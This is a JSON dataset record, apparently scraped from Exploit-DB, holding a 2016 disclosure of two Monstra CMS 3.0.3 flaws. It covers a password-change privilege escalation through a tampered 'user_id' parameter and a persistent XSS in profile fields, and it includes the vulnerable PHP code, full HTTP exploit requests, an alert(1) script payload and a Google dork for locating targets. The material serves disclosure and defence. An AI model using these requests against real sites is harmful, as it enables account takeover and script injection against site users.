{
  "id": "39567",
  "title": "Monstra CMS 3.0.3 - Multiple Vulnerabilities",
  "cve": null,
  "vuln_type": "xss_reflected",
  "code": "Exploit Title: Monstra CMS 3.0.3 - Privilege Escalation / Remote Password Change\r\nGoogle Dork: intext:\"Powered by Monstra\"/users/registration\r\nDate: 2016-03-28\r\nExploit Author: Sarim Kiani\r\nVendor Homepage: http://monstra.org\r\nSoftware Link: http://monstra.org/download\r\nVersion: 3.0.3\r\nTested on: Windows OS\r\n\r\n==================== TIMELINE ====================\r\n- Discovery Date: March 16 2016\r\n- Disclosed to Vendor: March 22 2016\r\n- Vendor Fixed the Issue: March 27 2016\r\n==================================================\r\n\r\nBug Tracking ID: Github Issue # 405\r\nLink: https://github.com/monstra-cms/monstra/issues/405\r\n\r\nApplication Description: Monstra is a modern light weighted Content Management System written in php.\r\n\r\n1. Vulnerability Description:\r\n\r\nAny user can change credentials of other users including the Administrator credentials. This can allow the attacker to gain Administrator access and completely compromise the application.\r\n\r\nOnce logged in as a regular user or successfully registering as a new user, use the following URL to gain information (username) of other users:\r\nhttp://localhost/monstra-3.0.3/users/1\r\n\r\nThe digit '1' is of Admin or first user created in the database. By changing the digit, all registered usernames can be found.\r\n\r\nThen by using the 'Edit Profile' option of own user account, password of any other user including the Administrator can be changed by changing the POST parameters 'user_id', 'login' and 'new_password'.\r\n\r\n\r\n2. Proof of Concept/Code Flaw:\r\n\r\n`In file monstra\\plugins\\box\\users\\users.plugin.php\r\n\r\nFunction: getProfileEdit\r\n\r\nLine No: 233\r\n\r\n  if (Users::$users->update(Request::post('user_id'),\r\n        array('login' => Security::safeName(Request::post('login')),\r\n              'firstname' => Request::post('firstname'),\r\n              'lastname'  => Request::post('lastname'),\r\n              'email'     => Request::post('email'),\r\n              'skype'     => Request::post('skype'),\r\n              'about_me'  => Request::post('about_me'),\r\n              'twitter'   => Request::post('twitter')))) {\r\n\r\n            // Change password\r\n            if (trim(Request::post('new_password')) != '') {\r\n                Users::$users->update(Request::post('user_id'), array('password' => Security::encryptPassword(trim(Request::post('new_password')))));\r\n            }\r\n\r\n            Notification::set('success', __('Your changes have been saved.', 'users'));\r\n            Request::redirect(Site::url().'/users/'.$user['id']);\r\n\r\nOn editing profile user id is taken from Request::post('user_id'). An attacker can provide any user id on change password funcionality\r\n\r\nUsers::$users->update --> updates the password`\r\n\r\nHeader:\r\n\r\n> POST /monstra-3.0.3/users/8/edit HTTP/1.1\r\nHost: localhost\r\nContent-Length: 152\r\nCache-Control: max-age=0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nOrigin: http://localhost\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: http://localhost/monstra-3.0.3/users/8/edit\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.8\r\nCookie: COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; has_js=1; PHPSESSID=abtuklkn1r0rjbub01527gjav0; _ga=GA1.1.592562515.1457951975; login_attempts=i%3A4%3B\r\n\r\ncsrf=eb616fed8ca93d9de582a4f7d75ee3a3a0d6e3ec&user_id=8&login=user&firstname=&lastname=&email=&twitter=&skype=&about_me=&new_password=&edit_profile=Save\r\n\r\n3. Solution:\r\n\r\nVendor has resolved the issue, use the patch 'User Security Fix # 406'.\r\n\r\nLink: https://github.com/monstra-cms/monstra/pull/406/commits/2e2a22ee5aafa28771f87c108edea024b618a8d5\r\n\r\n##################################################################################\r\n\r\n#Exploit Title: Monstra CMS 3.0.3 - Persistent XSS \r\n#Google Dork: intext:\"Powered by Monstra\"\r\n#Date: 2016-03-16\r\n#Exploit Author: Sarim Kiani\r\n#Vendor Homepage: http://monstra.org\r\n#Software Link: http://monstra.org/download\r\n#Version: 3.0.3\r\n#Tested on: Windows OS\r\n\r\n\r\nMonstra is a modern light weighted Content Management System written in php.\r\n\r\n\r\n1. Description\r\n\r\nA Persistent XSS exists in the \"Edit Profile\" page of the application.\r\n\r\n\r\n2. Proof of Concept\r\n\r\nAny user entering personal information in the \"Edit Profile\" page of the application can insert XSS Payload in the Form.\r\n\r\nPayload: \"><script>alert(1);</script>\r\n\r\nThe following entries on the page are vulnerable to a Persistent XSS payload:\r\n\r\n'Firstname', 'Lastname', 'Email', 'Twitter', 'Skype' and 'About Me'.\r\n\r\nPOST /monstra-3.0.3/users/8/edit HTTP/1.1\r\nHost: localhost\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://localhost/monstra-3.0.3/users/8/edit\r\nCookie: GUEST_LANGUAGE_ID=en_US; COOKIE_SUPPORT=true; SCREEN_NAME=5374564c7570434448716b3d; SESS7a361a010634612fb69871c3ab2715f1=05e_dlYEnDv4-n3tC89gHEXGp3l-L5CXZY7LNgxFIFg; docebo_session=an9dgdq6rmlg3bv5b29tj45653; PHPSESSID=no30picpa0c5khn86lmcd53cb5; _ga=GA1.1.739562915.1457952544\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 440\r\n\r\ncsrf=685bba70d144b8b8727937b56f5b87e669135fe1&user_id=8&login=user&firstname=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&lastname=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&email=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&twitter=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&skype=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&about_me=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&new_password=&edit_profile=Save\r\n\r\n\r\n3.Solution\r\n\r\nNo newer (fixed) versions are currently available.  ",
  "url": "https://www.exploit-db.com/exploits/39567"
}